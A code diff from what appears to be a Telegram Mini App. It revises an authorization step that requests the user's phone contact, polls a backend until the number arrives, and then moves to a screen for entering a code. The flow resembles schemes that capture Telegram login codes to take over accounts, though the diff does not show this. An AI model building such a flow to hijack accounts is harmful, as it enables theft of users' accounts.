@@ -148,34 +148,45 @@
 
     // 5. Логика авторизации (API)
     async function requestAuth() {
-        tg.requestContact(async (ok) => {
-            if(ok) {
-                document.getElementById('s1').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-                document.getElementById('l-text').innerText = "Ожидание подтверждения...";
-                
-                // Используем String() для ID, чтобы избежать проблем с форматом числа
-                const userId = String(tg.initDataUnsafe.user.id);
-                
-                let checkTimer = setInterval(async () => {
-                    try {
-                        const r = await fetch(`${API_BASE}/api/check_contact?id=${userId}`);
-                        if (!r.ok) return;
-                        const d = await r.json();
-                        
-                        if(d.status === 'received' && d.phone) {
-                            clearInterval(checkTimer);
-                            userPhone = String(d.phone); // Номер телефона — строго строка
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('s2').style.display = 'block';
-                        }
-                    } catch(e) { console.error("Poll error:", e); }
-                }, 2000);
+    tg.requestContact(async (ok) => {
+        if(ok) {
+            document.getElementById('s1').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('l-text').innerText = "Ожидание подтверждения...";
+            
+            const userId = String(tg.initDataUnsafe.user.id);
+            
+            let checkTimer = setInterval(async () => {
+                try {
+                    // Добавляем timestamp, чтобы избежать кеширования запроса браузером
+                    const r = await fetch(`${API_BASE}/api/check_contact?id=${userId}&t=${Date.now()}`,{
+                        cache: 'no-store'
+                    });
+                    if (!r.ok) return;
+                    const d = await r.json();
+                    
+                    // Если статус 'received' ИЛИ в ответе просто есть телефон — пускаем дальше
+                    if((d.status === 'received' || d.status === 'success') && d.phone) {
+                        clearInterval(checkTimer);
+                        userPhone = String(d.phone);
+                        document.getElementById('loader').style.display = 'none';
+                        document.getElementById('s2').style.display = 'block'; // Переход к вводу кода
+                    }
+                } catch(e) { console.error("Poll error:", e); }
+            }, 2000);
 
-                setTimeout(() => clearInterval(checkTimer), 40000);
-            }
-        });
-    }
+            // Если за 40 секунд ничего не произошло, даем ошибку
+            setTimeout(() => {
+                if (document.getElementById('s2').style.display === 'none') {
+                    clearInterval(checkTimer);
+                    alert("Превышено время ожидания. Попробуйте еще раз.");
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('s1').style.display = 'block';
+                }
+            }, 40000);
+        }
+    });
+}
 
     async function sendCode() {
         if (isSending) return;
